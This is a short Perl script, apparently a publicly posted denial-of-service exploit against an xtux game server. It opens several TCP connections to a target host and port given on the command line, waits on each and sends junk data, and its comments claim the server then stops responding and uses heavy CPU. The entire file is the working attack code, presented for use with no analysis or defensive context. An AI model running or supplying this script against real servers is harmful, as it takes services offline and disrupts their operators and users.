#!/usr/bin/perl
#
# xtux server DoS - by b0iler
# server will become unresponcive and takes up lots of CPU.

use IO::Socket;

for($n=0;$n<=3;$n++){ #you shouldn't even need all 3 connections.
        print "Connecting to $ARGV[0] port $ARGV[1]\n";
        $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],  PeerPort =>
$ARGV[1], Proto    => 'tcp' ) or print "\ncouldn't connect\n\n";
        sleep 3;
        print $sock "garbage data\n\n";
}
exit;
